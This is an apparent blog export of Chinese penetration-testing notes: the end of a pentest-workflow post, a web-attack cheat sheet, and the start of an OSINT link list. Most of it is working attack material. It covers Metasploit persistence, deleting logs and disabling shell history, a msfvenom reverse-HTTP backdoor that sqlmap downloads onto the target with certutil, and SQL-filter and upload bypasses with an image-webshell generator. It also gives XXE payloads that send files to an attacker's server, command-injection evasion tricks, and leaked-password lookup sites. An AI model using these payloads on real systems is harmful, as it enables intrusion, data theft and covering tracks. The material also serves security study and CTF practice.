模块，执行命令可以使目标机器每隔一定时间自动回连远控。但是容易被发现\ntxt#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀\nrun persistence -X -i 5 -p 8888 -r 192.168.10.27  \n \n#然后它就在目标机新建了这个文件：C:\\Windows\\TEMP\\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动4：在域环境下，想办法获得 krbtgt 用户的哈希，该用户的哈希可以进行票据传递攻击。而且一般该用户的密码不经常改变。\n5：shift后门\n6：远程桌面会话劫持\nLinux系统\n1：SSH后门\n2：crontab定时任务\n3：SSH公钥\n4：创建SUID&#x3D;0的用户\n七 痕迹清除当我们达到了目的之后，有时候只是为了黑入网站挂黑页，炫耀一下；或者在网站留下一个后门，作为肉鸡，没事的时候上去溜达溜达；亦或者挂入挖矿木马；但是大家千万不要干这些事，这些都是违法的！\n我这里只是教大家在渗透进去之后如何清除我们留下的一部分痕迹，并不能完全清除，完全清除入侵痕迹是不可能的！主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论你怎么清除，还是能查到的。\n最主要还是要以隐藏自身身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。\nWindows系统\n1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹\n2：如果3389远程登录过，需要清除mstsc痕迹\n3：执行命令清除日志：\ntxtdel %WINDR%\\* .log /a/s/q/f4：如果是web应用，找到web日志文件，删除\nLinux系统\n1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令\ntxtexport HISTFILE=/dev/null export HISTSIZE=02：删除 &#x2F;var&#x2F;log 目录下的日志文件\n3：如果是web应用，找到web日志文件，删除\n八 撰写渗透测试保告","slug":"转-渗透测试-基本流程","date":"2024-03-21T14:50:33.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"ac4ec20c26cff8515ee8496cfa9ab5e9","title":"WEB攻防-反序列化","content":"反序列化什么是反序列化格式转换\n\n序列化: 对象转换为数组或字符串等格式\n反序列化: 将数组或字符串等格式转换成对象\n\n\nPHP反序列化漏洞产生原因魔法方法\n\n触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法\n\nphp__construct()://构造函数，当对象new的时候会自动调用\n\n__destruct()://析构函数当对象被销毁时会被自动调用\n\n__wakeup()://unserialize()时会被自动调用\n\n__invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用\n\n__call(): //在对象上下文中调用不可访问的方法时触发\n\n__callStatci(): //在静态上下文中调用不可访问的方法时触发\n\n__get(): //用于从不可访问的属性读取数据\n\n__set(): //用于将数据写入不可访问的属性\n\n__isset(): //在不可访问的属性上调用isset()或empty()触发\n\n__unset(): //在不可访问的属性上使用unset()时触发\n\n__toString(): //把类当作字符串使用时触发\n\n__sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用\n演示:\n\nphp&lt;?php\n//序列化&amp;反序列化\nclass demotest&#123;\n    public $name=&#39;xiaodi&#39;;\n    public $sex=&#39;man&#39;;\n    public $age=&#39;29&#39;;\n&#125;\n$example=new demotest();\n$s=serialize($example);//序列化-&gt;O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;\n$u=unserialize($s);//反序列化-&gt;object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;\necho $s.&#39;&lt;br&gt;&#39;;\nvar_dump($u);\necho &#39;&lt;br&gt;&#39;;\n?&gt;创建对象即可触发__construct魔术方法，销毁对象触发__destruct，把类当作字符串使用时触发__toString()\n原生类浅析PHP原生类-安全客 - 安全资讯平台 (anquanke.com)\n漏洞示例__wakeup()方法绕过\n如果存在wakeup方法，调用unserilize()方法前则先调用wakeup方法\n\n但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会**跳过__wakeup()**的执行\n\n\ntxtO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;\n//修改为\nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;\nJAVA反序列化原理\n序列化: Java对象 –&gt; 字节序列\n反序列化: 字节序列 –&gt; Java对象\n\n利用Ysoserial\nfrohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)\n\n【Web安全】Ysoserial 简单利用-CSDN博客\n\n\n","slug":"WEB攻防-反序列化","date":"2024-03-18T13:45:44.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"11932efbcdc3039b003ba34e280dee13","title":"WEB攻防-通用漏洞","content":"WEB攻防-通用漏洞大型靶场Vulhub - Docker-Compose file for vulnerability environment\nSQL注入-补充内容ACCESS注入偏移注入使用场景\n知道表名\n不知道列名\n列名特殊, 无法爆破\n\n注入原理\n假设一个表有8个字段，admin表有3个字段。(需要先判断列数)\n\n联合查询payload：union select 1,2,3,4,5,6,7,8 from admin \n\n在我们不知道admin有多少字段的情况下可以尝试payload：union select 1,2,3,4,5,6,7,admin.* from admin，此时页面出错\n\n直到payload：union select 1,2,3,4,5,admin.* from admin时页面返回正常，说明admin表有三个字段\n\n然后通过移动admin.*的位置，就可以回显不同的数据\n\n\nMYSQL\n读取文件\ntxtselect load_file(&#39;D:/a.txt&#39;);\n写入文件\ntxtselect &#39;xxxx&#39; into outfile &#39;D:/a.txt&#39;;\n\nsqlmap\n1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园 (cnblogs.com)\n\nsqlmap联动msf\n攻击者服务器msf生成后门\nbashmsfvenom -p windows/meterpreter/reverse_http lhost=服务器地址 lport=端口 -f exe -o sql.exe\n开启监听：\nbashmsf6&gt; use exploit/multi/handler\nmsf6&gt; set lhost 0.0.0.0\nmsf6&gt; set lport 6666\nmsf6&gt; run\nsqlmap实现访问下载后门文件\nbashpython sqlmap.py -u &quot;url&quot; --os-cmd=&quot;certutil -urlcache -split -f http://xxxx/sql.exe c:/sql.exe&quot;\n\n脚本使用工具无法自动判断加密&#x2F;编码类型和数据格式(如json), 需要手工注入进行判断\n\n例如, 用base64编码payload:bashpython sqlmap.py -u &quot;url&quot; --tamper=base64encode.py\n\n(基于堆叠注入)绕过select过滤几种绕过select过滤的姿势 - 2hangG3 - 博客园 (cnblogs.com)\n\n原语句:\nsql1&#39;;select flag from `1919810931114514`;\n由于return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);select被过滤\n\n改为:\nsql1&#39;;set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;\n解析:\n\nsqlsEt @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);\nset用于设置变量名和值\nCONCAT拼接语句, 绕过过滤\n\n\nsqlprepare stmt from @sql;prepare用于预备一个语句，并赋予名称，以后可以引用该语句\n\nsql\n\n  EXECUTE stmt;\ntxt\n`execute`执行语句\n\n二次注入原理\n普通注入: 数据直接进入到 SQL 查询中\n二次注入: 输入数据经处理后存储, 取出后, 再次进入到 SQL 查询\n\n过程\n插入1‘#\n被转义成1\\’#\n不能注入，但是保存在数据库时变成了原来的1’#\n利用1’#进行注入,这里利用时要求取出数据时不转义\n\n案例网鼎杯2018-Unfinish\n\n注册时在username注入sql语句\n此时数据被转义, 无法注入\n利用邮箱登录后重新加载username, 此时没有转义, 注入语句成功执行\n\nDNS注入\nDNS协议：将域名转化为IP 日志 &#x3D;&gt; 记录了域名转化IP请求\n\nDNS注入的核心，将盲注转化为显错注入\n\npayload例子:\n\nsqlselect load_file(concat(&#39;//&#39;,(select database() limit 0,1),&#39;.81k8pu.dnslog.cn/abc&#39;));文件上传靶场: c0ny1&#x2F;upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)\n推荐文章: 一文爽 文件上传漏洞原理、方法和类型详细解析 - 知乎 (zhihu.com)\n黑白盒测试黑盒寻找一切存在文件上传的功能应用\n\n个人用户中心是否存在文件上传功能\n后台管理系统是否存在文件上传功能\n字典目录扫描探针文件上传构造地址\n字典目录扫描探针编辑器目录构造地址\n\n白盒看三点，中间件，编辑器，功能代码\n\n中间件直接看语言环境常见搭配\n编辑器直接看目录机构或搜索关键字\n功能代码直接看源码应用或搜索关键字\n\n解析执行.user.ini\n可以上传一个.user,ini文件, 自定义以php解析特定文件, 例如txtauto_prepend_file=test.txt\n//或者\nauto_append_file=test.txt\n\n.htaccess原理\n.htaccess文件是Apache服务器中的一个配置文件\n.apache配置文件为AllowOverride All(默认为None)\n\n条件\nApache开启rewrite模块\n\n示例txt&lt;FilesMatch&quot;x.png&quot;&gt;\nSetHandlerapplication/x-httpd-php\n&lt;/FilesMatch&gt;\nx.png是代码将该目录下文件叫x.png的文件以php进行执行\n上传.htaccess，上传一张名叫x.png的文件，即可执行\n\n过滤绕过绕过&lt;?php?&gt;过滤\n&lt;?   ?&gt;需要开启短标签开关，short_open_tag\n&lt;?= ?&gt;PHP版本&gt;PHP 5.4.0\n&lt;% %&gt;asp_tags设成On\n&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;php7之后就不能用了\n\n利用反引号&#96;&#96;绕过\n反引号运算符”&#96;”相当于 “shell_exec() “函数, 将里面的内容作为shell命令来执行\n\n包含日志\n将后门代码写入UA头中\n\n写入.user.ini配置文件，将日志文件内容通过文件包含访问\n\n例如:\nuser.ini:auto_prepend_file-test.pngtest.png:&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;\n\n\n短网址绕过”.”\n在需要远程文件包含, 但过滤了点号.时, 可以使用短链接\n比如http://47.94.236.117/转换为http://794750069/就可以绕过过滤\n\n文件头检测\n文件头部检测是否为图片格式文件, 如图像会检测头部是否为GIF89a\n\n可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.pngtest.png:GIF89A\n\n\n常见文件的文件头标志 - M4x - 博客园 (cnblogs.com)\n\n\n条件竞争【文件上传绕过】——条件竞争漏洞-CSDN博客\n漏洞原理\n\n\n\n\n\n\n\n\n服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生\n例如:\n\n上传文件源代码里没有校验上传的文件\n上传成功后才进行判断\n如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除\n\n利用\n营造10000人同时上传文件1.php的情境, 另外有10000人在同时访问这个1.php\n上传文件时，这个文件会有一段时间留存在服务器的上传目录下\n而服务器脚本在进行判断文件是否合法而对文件进行删除时，会有一定的处理时间\n可能在某个时间里，服务器还未来得及删除文件,\n此时利用1.php重新生成一个php文件\n\n二次渲染文件上传之二次渲染绕过_二次渲染绕过怎么操作-CSDN博客\n【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客\n二次渲染原理\n\n\n\n\n\n\n\n\n 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。\n识别\n检查上传前后图片文件大小是否更改\n\n绕过\n使用脚本生成图片马, 例如:php&lt;?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n \n \n \n$img = imagecreatetruecolor(32, 32);\n \nfor ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n&#125;\n \nimagepng($img,&#39;./1.png&#39;);\n?&gt;\n\n中间件解析漏洞中间件文件解析漏洞概述及实例——Apache、IIS和Nginx_中间件解析漏洞-CSDN博客\nIIS 5.x-6.x\n文件解析: iis6.0下，分号后面的不被解析, xx.asp;.jpg被解析为asp\n目录解析: 名字为.asp、.asa的文件夹, 其下任何扩展名的文件都被IIS当做asp文件来解析并执行\n\nIIS7.5\n与nginx的类似\n\napache换行解析\n利用前提: 黑名单验证(不能上传php jsp等) version: 2.4.0~2.4.29\n\n在解析PHP时，1.php%0A将被按照PHP后缀进行解析(%0a为换行)\n\n\n多后缀解析\nApache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令\n\n如果添加了如下配置, 1.php.png可以当成php解析\ntxtAddHandler application/x-httpd-php .php\n\nNginx文件名逻辑漏洞\n1.gif[0x20][0x00].phpNginx却错误地认为请求的文件是1.gif[0x20]\n\n解析漏洞\n用户配置不当造成漏洞\nhttp://ip/1.png访问图片, http://ip/1.png/.php解析图片为php\n\n编辑器漏洞\nUeditor、FCKeditor、Kindeditor编辑器漏洞_kindeditor漏洞-CSDN博客\n\n文件包含思路要点黑盒\n主要观察参数传递的数据和文件名是否对应\n\n白盒\n可通过应用功能追踪代码定位审计\n可通过却本特定函数搜索定位审计\n可通过伪协议玩法绕过相关修复等\n\nphp伪协议PHP伪协议总结 - 个人文章 - SegmentFault 思否\nfile 协议条件\nallow_url_fopen:off&#x2F;on\nallow_url_include :off&#x2F;on\n\n示例\ntxt?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\ntxt?file=./phpinfo.txt\n\nphp 协议条件\n\nallow_url_fopen:off&#x2F;on\nallow_url_include :仅php://input php://stdin php://memory php://temp 需要on\n\n\n\n\n协议\n作用\n\n\n\nphp:&#x2F;&#x2F;input\n可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。\n\n\nphp:&#x2F;&#x2F;output\n只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。\n\n\nphp:&#x2F;&#x2F;fd\n(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。\n\n\nphp:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp\n(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。\n\n\nphp:&#x2F;&#x2F;filter\n(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。\n\n\nphp://filter参数详解\n\n\nphp:&#x2F;&#x2F;filter 参数\n描述\n\n\n\nresource&#x3D;&lt;要过滤的数据流&gt;\n必须项。它指定了你要筛选过滤的数据流。\n\n\nread&#x3D;&lt;读链的过滤器&gt;\n可选项。可以设定一个或多个过滤器名称，以管道符（\\ ）分隔。\n\n\nwrite&#x3D;&lt;写链的过滤器&gt;\n可选项。可以设定一个或多个过滤器名称，以管道符（\\）分隔。\n\n\n&lt;; 两个链的过滤器&gt;\n任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。\n\n\n示例:\nphp://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）\ndata 协议条件\nallow_url_fopen:on\nallow_url_include :on\n\n示例\ntxt?file=data://text/plain,&lt;?php%20phpinfo();?&gt;\ntxt?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n\nhttp &amp; https 协议条件\nallow_url_fopen:on\nallow_url_include :on\n\n作用\n通常用于远程包含\n\n示例\ntxt?file=http://127.0.0.1/phpinfo.txt\n\nLFI 本地文件包含\n通过文件上传\n借助日志(UA头), session写入\n伪协议+编码解码\n\nXXE – XML External Entity InjectionCTF XXE - MustaphaMond - 博客园 (cnblogs.com)\n\n全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。\n危害: 文件读取, 端口探针等\n\nXML概念\nXML即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：\n\nHTML 被设计用来显示数据\nXML 被设计用来传输和存储数据\n\n\nXML文档结构包括：\n\nXML声明\nDTD文档类型定义（可选）\n文档元素\n\n\n示例:\nxml&lt;!--XML声明--&gt;\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n\n&lt;!--DTD，这部分可选的--&gt;          \n&lt;!DOCTYPE foo [ \n    &lt;!ELEMENT foo ANY &gt;\n    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;\n]&gt;\n\n&lt;!--文档元素--&gt;                                                                          \n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\nDTD\n文档类型定义（DTD）用来为XML文档定义语义约束, 可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。\n\nDTD一般认为有两种引用或声明方式：\n\n1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。\ntxt&lt;!DOCTYPE note [\n    &lt;!ENTITY a &quot;admin&quot;&gt;\n]&gt;\n&lt;note&gt;&amp;a&lt;/note&gt;\n&lt;!-- admin --&gt;\n2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。\ntxt&lt;!DOCTYPE note&gt; [\n    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;\n]&gt;\n&lt;note&gt;&amp;c&lt;/note&gt;\n&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;\n\n\n实体声明方式:\n\n内部实体\nxml&lt;!DOCTYPE note [\n    &lt;!ENTITY a &quot;admin&quot;&gt;\n]&gt;\n&lt;note&gt;&amp;a&lt;/note&gt;\n&lt;!-- admin --&gt;\n参数实体\nxml&lt;!DOCTYPE note&gt; [\n    &lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;\n    %b;\n]&gt;\n&lt;note&gt;&amp;b1&lt;/note&gt;\n&lt;!-- awsl --&gt;\n参数实体用% name申明，引用时用%name;，只能在DTD中申明，DTD中引用。\n其余实体直接用name申明，引用时用&amp;name;，只能在DTD中申明，可在xml文档中引用\n\n\n外部实体\nxml&lt;!DOCTYPE note&gt; [\n    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;\n]&gt;\n&lt;note&gt;&amp;c&lt;/note&gt;\n&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;\n外部引用可支持http，file等协议\n\n\n外部参数实体\nxml&lt;!DOCTYPE note&gt; [\n    &lt;!ENTITY % d SYSTEM &quot;http://47.106.143.26/xml.dtd&quot;&gt;\n    %d;\n]&gt;\n&lt;note&gt;&amp;d1&lt;/note&gt;\n&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;http://47.106.143.26/xml.dtd:\nxml&lt;!-- http://47.106.143.26/xml.dtd --&gt;\n&lt;!ENTITY d1 SYSTEM &quot;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&quot;&gt;\n\n\n\nXML外部实体注入(XXE)漏洞发现黑盒\n获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试\n不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试XXE\nXXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行\n\n白盒\n可通过应用功能追踪代码定位审计\n\n可通过脚本特定函数搜索定位审计\n\n可通过伪协议玩法绕过相关修复等\n\n\n任意文件读取有回显\n直接读靶机文件\nxml&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&lt;!DOCTYPE foo [ \n&lt;!ENTITY rabbit SYSTEM &quot;file:///flag&quot; &gt;\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;\n恶意引入外部参数实体\nxml&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE test [\n    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;\n    %file;\n]&gt;\n&lt;test&gt;&amp;hhh;&lt;/test&gt;hack.dtd:\nxml&lt;!ENTITY hhh SYSTEM &#39;file:///etc/passwd&#39;&gt;\n\n无回显\n先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。\nxml&lt;!DOCTYPE updateProfile [\n    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt;\n    &lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;\n    %dtd;\n    %send;\n]&gt;evil.dtd:\nxml&lt;!ENTITY % all\n    &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://xxx.xxx.xxx/?data=%file;&#39;&gt;&quot;\n&gt;\n%all;\n\n利用场景\nsvg\n\nexcel\n利用EXCEL进行XXE攻击 - 先知社区 (aliyun.com)\n\n\n防御\n禁用dtd实体引用\n过滤关键词\n\nRCE – 远程代码执行漏洞原理\n系统命令执行函数\naplsystem()\npassthru()\nexec()\nshell_exec()\npopen()\nproc_open()\npcntl_exec()\n系统命令拼接方式\n\n| , ||\n&amp;, &amp;&amp;\n;\n%0a\n\n\n\n绕过常见操作系统命令注入思路_命令注入 bypass-CSDN博客\n通配符绕过phpsystem(‘tac fla*.php’);参数逃逸phpeval($GET[1]);&amp;1=system(‘tac flag.php’);包含&amp;伪协议phpinclude$_ GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#39;tac flag.php&#39;);?&gt;\ninclude$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php花括号&#123;&#125;\n在Linux bash中还可以使用&#123;xxxx&#125;来执行系统命令\n\nsh&#123;cat,flag&#125;斜杠\n路径 &#x2F;\n\n\\是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。\n\n也就意味着，我们可以在rce漏洞，过滤掉cat ls等命令时候，直接使用ca\\t来实现绕过\n\n\n空格过滤\n&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等\n\n一些命令分隔符linux中：%0a(回车) 、%0d(换行) 、; 、&amp; 、| 、&amp;&amp;、||windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）\n黑名单绕过拼接绕过\n利用偶读拼接方法绕过黑名单：a=fl;b=ag;cat $a$b\n利用.拼接绕过(sy.(st).em)\n\n编码绕过shecho &#39;Y2F0wqAK&#39; | base64 -d单引号和双引号绕过shc&#39;&#39;t flag \nca&quot;&quot;t flag利用Shell 特殊变量绕过第一个参数是1，第二个参数是2。而参数不存在时其值为空\nshca$@t fla$@g\nca$1t fla$2glinux中查看文件内容cat、tac、more、less、head、tail、nl、sed、sort、uniq\ntxtmore:一页一页的显示档案内容\nless:与 more 类似\nhead:查看头几行\ntac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\ntail:查看尾几行\nnl：显示的时候，顺便输出行号\nod:以二进制的方式读取档案内容\nvi:一种编辑器，这个也可以查看\nvim:一种编辑器，这个也可以查看\nsort:可以查看\nuniq:可以查看\nfile -f:报错出具体内容SSRF – 服务器端请求伪造\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n\nSSRF漏洞挖掘漏洞产生场景\n分享：通过URL地址分享网页内容\n\n转码服务: 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n在线翻译:通过URL地址翻译对应文本的内容\n\n图片、文章收藏功能\n\n未公开的api实现以及其他调用URL的功能\n\n图片加载与下载:通过URL地址加载或下载图片\n\n从URL关键字中寻找, 利用google 语法加上这些关键字去寻找SSRF漏洞\ntxtshare wap url link src source target u display sourceURl imageURL domain\n\n产生SSRF漏洞的函数file_get_contents从指定url获取文件:\nphp$content = file_get_contents($_POST[&#39;url&#39;]); fsockopen()txt$fp = fsockopen($host, intval($port), $errno, $errstr, 30); curl_exec()php$link = $_POST[&#39;url&#39;];\n$curlobj = curl_init();\ncurl_setopt($curlobj, CURLOPT_POST, 0);\ncurl_setopt($curlobj,CURLOPT_URL,$link);\ncurl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($curlobj);SSRF中URL的伪协议当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议\n\n\n\n\n\n\n\n\n\nfile:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，xxxxxx.com&#x2F;index.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwddict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议ldap:&#x2F;&#x2F; 轻量级目录访问协议, url&#x3D;ldap:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aquitftp:&#x2F;&#x2F; 简单文件传输协议gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload\n","slug":"WEB攻防-通用漏洞","date":"2024-03-05T15:07:08.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"7877f5fab13c4afbf71848ed5da71412","title":"(转)知识点合集","content":" Author: Evi1cg Blog: https://evi1cg.github.io\n信息搜集开源情报信息收集（OSINT）github\nGithub_Nuggests（自动爬取Github上文件敏感信息泄露） :https://github.com/az0ne/Github_Nuggests\nGSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :https://github.com/FeeiCN/GSIL\nx-patrol(小米团队的):https://github.com/MiSecurity/x-patrol\n\nwhois查询&#x2F;注册人反查&#x2F;邮箱反查&#x2F;相关资产\n站长之家:http://whois.chinaz.com/?DomainName=target.com&amp;ws=\n爱站:https://whois.aizhan.com/target.com/\n微步在线:https://x.threatbook.cn/\nIP反查:https://dns.aizhan.com/\n天眼查:https://www.tianyancha.com/\n虎妈查:http://www.whomx.com/\n历史漏洞查询 :\n在线查询:http://wy.zone.ci/\n自搭建:https://github.com/hanc00l/wooyun_public/\n\n\n\ngoogle hacking创建企业密码字典字典列表\npasswordlist:https://github.com/lavalamp-/password-lists\n猪猪侠字典:https://pan.baidu.com/s/1dFJyedzBlasting_dictionary（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） \n针对特定的厂商，重点构造厂商相关域名的字典\n\ntxt[&#39;%pwd%123&#39;,&#39;%user%123&#39;,&#39;%user%521&#39;,&#39;%user%2017&#39;,&#39;%pwd%321&#39;,&#39;%pwd%521&#39;,&#39;%user%321&#39;,&#39;%pwd%123!&#39;,&#39;%pwd%123!@#&#39;,&#39;%pwd%1234&#39;,&#39;%user%2016&#39;,&#39;%user%123$%^&#39;,&#39;%user%123!@#&#39;,&#39;%pwd%2016&#39;,&#39;%pwd%2017&#39;,&#39;%pwd%1!&#39;,&#39;%pwd%2@&#39;,&#39;%pwd%3#&#39;,&#39;%pwd%123#@!&#39;,&#39;%pwd%12345&#39;,&#39;%pwd%123$%^&#39;,&#39;%pwd%!@#456&#39;,&#39;%pwd%123qwe&#39;,&#39;%pwd%qwe123&#39;,&#39;%pwd%qwe&#39;,&#39;%pwd%123456&#39;,&#39;%user%123#@!&#39;,&#39;%user%!@#456&#39;,&#39;%user%1234&#39;,&#39;%user%12345&#39;,&#39;%user%123456&#39;,&#39;%user%123!&#39;]密码生成\nGenpAss（中国特色的弱口令生成器: https://github.com/RicterZ/genpAss/\npassmaker（可以自定义规则的密码字典生成器） ：https://github.com/bit4woo/passmaker\npydictor（强大的密码生成器） ：https://github.com/LandGrey/pydictor\n\n邮箱列表获取\ntheHarvester ：https://github.com/laramies/theHarvester\n获取一个邮箱以后导出通讯录 \nLinkedInt :https://github.com/mdsecactivebreach/LinkedInt\nMailget：https://github.com/Ridter/Mailget\n\n泄露密码查询\nghostproject: https://ghostproject.fr/\npwndb: https://pwndb2am4tzkvold.onion.to/\n\n对企业外部相关信息进行搜集子域名获取\nLayer子域名挖掘机4.2纪念版 \nsubDomainsBrute ：https://github.com/lijiejie/subDomainsBrute\nwydomain ：https://github.com/ring04h/wydomain\nSublist3r ：https://github.com/aboul3la/Sublist3r\n企查查：https://www.qcc.com/\n天眼查：https://www.tianyancha.com/\nsite:target.com:https://www.google.com\nGithub代码仓库 \n抓包分析请求返回值(跳转&#x2F;文件上传&#x2F;app&#x2F;api接口等) \n站长帮手links等在线查询网站 